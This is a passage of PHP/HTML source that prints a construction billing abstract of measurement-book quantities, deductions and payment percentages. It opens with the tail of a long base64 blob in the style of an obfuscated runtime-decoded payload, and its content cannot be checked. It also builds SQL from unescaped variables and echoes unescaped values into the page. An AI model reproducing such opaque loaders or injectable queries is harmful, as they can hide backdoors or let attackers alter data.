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')))));
if($slm_cnt == 0)
{
	$slm_str = "";
}
if($dpm_cnt == 0)
{
	$dpm_str = "";
}
$item_str = $slm_str."@@@".$dpm_str;
$slm_str = ""; $dpm_str = "";
$checkbox_str = $subdivid."*".$subdivname."*".$description."*".$slm_measurement_qty."*".$dpm_measurement_qty."*".$rate."*".$unit."*".$abstsheetid;

//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
?>
<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
<tr border='1' bgcolor="">
	<td  align='center' width='' class='labelsmall' style=" border-top:1px solid #046CA8; border-bottom:1px solid #046CA8;" id="td_popupbutton<?php echo $table_group_row; ?>">
		<input type="checkbox" name="check" id="ch_item<?php echo $table_group_row; ?>" value="<?php echo $checkbox_str; ?>"  data-sec_type="<?php echo $section_type; ?>" data-subdivid="<?php echo $subdivid; ?>" data-sheetid="<?php echo $abstsheetid; ?>" data-rbn="<?php echo $rbn; ?>"/>
	</td>
	<td width="61px" align="center" style="border-top:1px solid #046CA8;" class="">
		<?php echo $subdivname;?>
	</td>
	<td colspan="8" style="border-top:1px solid #046CA8;" class="">
		<?php echo $description; ?>
	</td>
	<td style="border-top:1px solid #046CA8;" width="40px">&nbsp;</td>
	<td style="border-top:1px solid #046CA8;" width="40px">&nbsp;</td>
	<td style="border-top:1px solid #046CA8;" width="40px">&nbsp;</td>
</tr>
<?php 
$rowcount++;
//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
	$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
	$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
	$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
	$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;

	if($dpm_cnt > 0)
	{
		$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
		 $DpmTemp = 0;
		for($x4=0; $x4<count($eplodedpm); $x4+=13)
		{
			$dpmqty 				= $eplodedpm[$x4+1];
			//echo $dpmqty."<br/>";
			$remarks 				= $eplodedpm[$x4+10];
			$rbnDpm					= $eplodedpm[$x4+11];
			$MeasurementbookidDpm	= $eplodedpm[$x4+12];
			$paymentpercent_dpm 	= $eplodedpm[$x4+7];
			$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
			$dummy=0;
			if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
			{
				$ArrUniqueVal 		= array_unique($DpmArrMbidList);
				$UniqueCount 		= count($ArrUniqueVal);
				$x6=0;
				$count_1 			= count($DpmArrAmbList);
				$count_2 			= count($DpmArrAmbPgList);
				$AMBookNo 			= $DpmArrAmbList[$count_1-1];
				$AMBookPage 		= $DpmArrAmbList[$count_2-1];
				//while($x6<=$UniqueCount)
				foreach($ArrUniqueVal as $StartKey)
				{
					//$StartKey 		= $ArrUniqueVal[$x6];
					$PaidDpmPerc 	= $DpmArrPercent[$StartKey];
					$rowspancnt 	= $dpm_cnt;//$UniqueCount+$DpmTemp;
					$DpmKeyresult	= checkPartpayment($DpmArrMbidList,$StartKey);
					$DpmPercSum 	= $PaidDpmPerc;
					if($DpmKeyresult != "")
					{
						$explodeDpmKeyresult = explode("*",$DpmKeyresult);
						for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
						{
							$key = $explodeDpmKeyresult[$x7];
							$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
						}
						if(($x6 == 0)&&($DpmTemp == 0))
						{
						$DpmQuantityty_1 = $DpmArrQuantityList[$key];
						$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
							}
						$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
						
?>
					<tr border='1' bgcolor="#FFFFFF">
						<td  align='center' width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right'   width='180px' 	class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo "Prev-Qty Vide";//.$AbstractMbookPageNo."/Abstract MB No.".$AbstractMbookNo; ?>&nbsp;</td>
						<td  align='right' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' 		class='' rowspan="<?php echo $rowspancnt; ?>"></td>
						<td  align='right' 	width='' 		class=''><?php echo $DpmQuantityty_1;//$QtyDpmSlm_1; ?></td>
						<td  align='right' 	width='' 		class=''>
						<?php 
							//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
							if(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0)){
								//echo number_format($QSPPDPMMasterArr[$StartKey], 2, '.', '');
								$DpmAmount_1 = $DpmAmount_1 + $QSPPDPMMasterArr[$StartKey];
							}
							echo number_format($DpmAmount_1, 2, '.', ''); 
							$dpm_amount_item  = $dpm_amount_item + $DpmAmount_1;
						?>
						</td>
						<td  align='right' 	width='6%' 		class='' rowspan=""></td>
						<td  align='right' 	width='3%' 		class='' rowspan="">
						<?php
						if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
							echo number_format($QSPPSLMMasterArr[$StartKey], 2, '.', '');
							$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$StartKey];
						}else{	
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
							}
						} 
						?>
						</td>
						<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
							<?php 
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo $total_percent_dpm_slm_1."% Paid"; 
							}
							?>
						</td>
					</tr>

<?php					$rowcount++;	
						}
						
						else
						{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
								$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
								
							}
							if(in_array($StartKey, $DpmArrMbidList))
							{ 
								$Arrkey = array_search($StartKey, $DpmArrMbidList);
								$QtyDpmSlm_22 = $DpmArrQuantityList[$Arrkey];
								$PercDpmSlm_22 = $DpmPercSum;//$DpmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_22 = $QtyDpmSlm_22 * $PercDpmSlm_22 * $rate/100;
								$total_percent_dpm_slm_22 = $DpmPercSum+$PercDpmSlm_22;
								
							}
							/*else
							{
								$QtyDpm_5 = $DpmArrQuantityList[$key];
								//$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
								$Dpm_Slm_Amount_2 = $QtyDpm_5 * $DpmPercSum * $rate/100;
							}*/
?>
							<tr border='1' bgcolor="#FFFFFF">
								<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
								<td  align='right' width='' class=''>
									<?php 
									//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
									if(($QSPPDPMMasterArr[$StartKey] != '') && ($QSPPDPMMasterArr[$StartKey] != 0)){
										//echo number_format($QSPPDPMMasterArr[$StartKey], 2, '.', '');
										$Dpm_Slm_Amount_22 = $Dpm_Slm_Amount_22 + $QSPPDPMMasterArr[$StartKey];
									}
									echo number_format($Dpm_Slm_Amount_22, 2, '.', ''); 
									$dpm_amount_item 		= $dpm_amount_item + $Dpm_Slm_Amount_22;
									?>
								</td>
								<td  align='right' width='' class=''></td>
								<td  align='right' width='' class=''>
								<?php
								if(($QSPPSLMMasterArr[$StartKey] != '') && ($QSPPSLMMasterArr[$StartKey] != 0)){
									echo number_format($QSPPSLMMasterArr[$StartKey], 2, '.', '');
									$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$StartKey];
								}else{
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
									} 
								}
								?>
								</td>
								<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
									<?php 
									if(in_array($StartKey, $SlmArrMbidList))
									{
									echo $total_percent_dpm_slm_2."% Paid"; 
									}
									else{
										echo $DpmPercSum."% Paid";
									}
									?>
								</td>
							</tr>
		<?php				$rowcount++;		
						}
						
					}
					$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
					$x6++;	
					array_push($temp_array,$StartKey);
				}
				
			}
							//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
			$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;				
			if(in_array($MeasurementbookidDpm, $temp_array))
			{
				$dummy = 1;
			}
			else
			{
				if($x4 == 0)
				{ 
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
					}
					//echo $QtyDpmSlm_3 ."*". $PercDpmSlm_3 ."*". $rate."<br/>";
					$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
?>
					<tr border='1' bgcolor="#FFFFFF">
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide ";//.$AbstractMbookPageNo."/Abstract MB No.".$AbstractMbookNo; ?>&nbsp;</td>
						<td  align='right' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' 	width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' 	width='' class=''>
							<?php 
								echo number_format($dpmqty, $decimal, '.', ''); 
							?>
						</td>
						<td  align='right' width='' class=''>
							<?php
								//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
								if(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0)){
									//echo number_format($QSPPDPMMasterArr[$MeasurementbookidDpm], 2, '.', '');
									$dpmamt = $dpmamt + $QSPPDPMMasterArr[$MeasurementbookidDpm];
								}
								
								echo number_format($dpmamt, 2, '.', ''); 
								$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
							?>
						</td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
							<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo number_format($QSPPSLMMasterArr[$MeasurementbookidDpm], 2, '.', '');
								$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$MeasurementbookidDpm];
							}else{
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
								}
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php 
								echo $total_percent_dpm_slm_3."% Paid"; 
							?>
						</td>
					</tr>	
<?php 			$rowcount++;
				}
				if(($dpm_cnt > 1) && ($x4 != 0))
				{
					$PaidDpmPerc2 = 0;
					$PaidDpmPerc2 = $paymentpercent_dpm;
					if(in_array($MeasurementbookidDpm, $DpmArrMbidList)){
						$ArrUniqueVal2 	= array_unique($DpmArrMbidList); 
						$UniqueCount2 	= count($ArrUniqueVal2); 
						foreach($ArrUniqueVal2 as $StartKey2=>$StartKey2Val){
							$PaidDpmPerc2 	= $PaidDpmPerc2+$DpmArrPayPercentList[$StartKey2]; 
							$DpmKeyresult2 	= checkPartpayment($DpmArrMbidList,$StartKey2);
							if($DpmKeyresult2 != ""){
								$explodeDpmKeyresult2 = explode("*",$DpmKeyresult2); 
								for($z7=0; $z7<count($explodeDpmKeyresult2); $z7++){
									$key2 		= $explodeDpmKeyresult2[$z7];
									$PaidDpmPerc2 = $PaidDpmPerc2 + $DpmArrPayPercentList[$key2]; 
								}
							}
						}
					}
					$paymentpercent_dpmA = 0; $PercDpmSlm_4 = 0;
					$paymentpercent_dpmA = $PaidDpmPerc2;
					$dpmamtA 				= $dpmqty * $rate * $PaidDpmPerc2 / 100;
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_4 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_4 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_4 = $QtyDpmSlm_4 * $PercDpmSlm_4 * $rate /100;
					}
					$total_percent_dpm_slm_4 = $paymentpercent_dpmA + $PercDpmSlm_4;
?>
				<tr border='1' bgcolor="#FFFFFF">
					<td  align='right' width='' class=''><?php echo number_format($dpmqty, $decimal, '.', ''); ?></td>
					<td  align='right' width='' class=''>
						<?php 
						//// This is for Deduct Previous Amount for Mechanical undated on 19/02/2019
						if(($QSPPDPMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPDPMMasterArr[$MeasurementbookidDpm] != 0)){
							//echo number_format($QSPPDPMMasterArr[$MeasurementbookidDpm], 2, '.', '');
							$dpmamtA = $dpmamtA + $QSPPDPMMasterArr[$MeasurementbookidDpm];
						}
						echo number_format($dpmamtA, 2, '.', ''); 
						$dpm_amount_item 		= $dpm_amount_item + $dpmamtA;
						?>
					</td>
					<?php if($dummy == 0) 
					{
					?>
					<td  align='right' width='' class=''></td>
					<td  align='right' width='' class=''>
						<?php 
							if(($QSPPSLMMasterArr[$MeasurementbookidDpm] != '') && ($QSPPSLMMasterArr[$MeasurementbookidDpm] != 0)){
								echo number_format($QSPPSLMMasterArr[$MeasurementbookidDpm], 2, '.', '');
								$slm_amount_item = $slm_amount_item + $QSPPSLMMasterArr[$MeasurementbookidDpm];
							}else{
								if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
								{
									echo number_format($Dpm_Slm_Amount_4, 2, '.', '');
									$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_4;
								}
							}
						?>
					</td>
					<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
						<?php
						//if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
						//{
							echo $total_percent_dpm_slm_4."% Paid";
						//}
						?>
					</td>
					<?php 
					} 
					?>
				</tr>
<?php	
				$rowcount++;
				}
			}
			$DpmTemp++; 
		}
		//$rowcount++;
	}

//*************THIS PART IS FOR " PRINT " ---- SINCE LAST MEASUREMENT ( S.L.M. ) SECTION*******************//
	
?>
<?php
	$slm_dpm_str = $slm_measurement_qty."*".$dpm_measurement_qty;
	$mbooktype_query = "select flag from mbookgenerate WHERE subdivid = '$subdivisionlist[$i]' AND sheetid = '$abstsheetid'";
	$mbooktype_sql = mysql_query($mbooktype_query);
	$flagtype = @mysql_result($mbooktype_sql,0,'flag');
	if($flagtype == 1) { $mbookdescription = "/General MB No. "; }
	if($flagtype == 2) { $mbookdescription = "/Steel MB No. "; }

	if($slm_cnt > 0)
	{
		$eplodeslm = explode("*", rtrim($slm_mesurementbook_details,"*"));
		for($x3=0; $x3<count($eplodeslm); $x3+=12)
		{
			$slmqty = $eplodeslm[$x3+1];
			
			$remarks = $eplodeslm[$x3+10];
			$paymentpercent = $eplodeslm[$x3+7];
			$slmamt = $slmqty * $rate * $paymentpercent / 100;
			$slm_amount_item = $slm_amount_item + $slmamt;
			if($x3 == 0)
			{
?>
		<tr border='1' bgcolor="#FFFFFF">
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo "Qty Vide";//.$mbpageno_slm.$mbookdescription.$mbookno_slm; ?>&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>"><?php echo number_format($slm_measurement_qty, $decimal, '.', ''); ?></td>
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='left' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class='' rowspan="<?php echo $slm_cnt; ?>">&nbsp;</td>
			<td  align='right' 	width='' class=''>
				<?php 
					echo number_format($slmqty, $decimal, '.', ''); 
				?>
			</td>
			<td  align='right' width='' class=''>
				<?php 
					echo number_format($slmamt, 2, '.', ''); 
				?>
			</td>
			<td  align='center' width='' class='' style="font-size:9px;">
				<?php 
					echo $paymentpercent."% Paid"; 
				?>
			</td>
		</tr>
<?php
			}
			if(($slm_cnt > 1) && ($x3 != 0))
			{
?>
		<tr border='1' bgcolor="#FFFFFF">
			<td  align='right' width='' class=''><?php echo number_format($slmqty, $decimal, '.', ''); ?></td>
			<td  align='right' width='' class=''><?php echo number_format($slmamt, 2, '.', ''); ?></td>
			<td  align='center' width='' class='' style="font-size:9px;"><?php echo $paymentpercent."% Paid"; ?></td>
		</tr>
<?php
			$rowcount++;
			}
		}
	$rowcount++;
	}
	//if($PartPayremarks != "")
	//{
?>
		<tr border='1' class="label" style="font-size:10px;">
			<td align="left" bgcolor="#F5F5F5">
			Remarks :
			</td>
			<td colspan="11" align="left" bgcolor="#F5F5F5">
			<textarea name="txt_common_remark_<?php echo $subdivisionlist[$i]; ?>" id="txt_common_remark_" class="textboxdisplay rem-area"><?php echo $PartPayremarks; ?></textarea>
			<input type="hidden" name="txt_rem_item_id[]" id="txt_rem_item_id" value="<?php echo $subdivisionlist[$i]; ?>" />
			</td>
		</tr>
<?php	
		$rowcount++;
	//}	
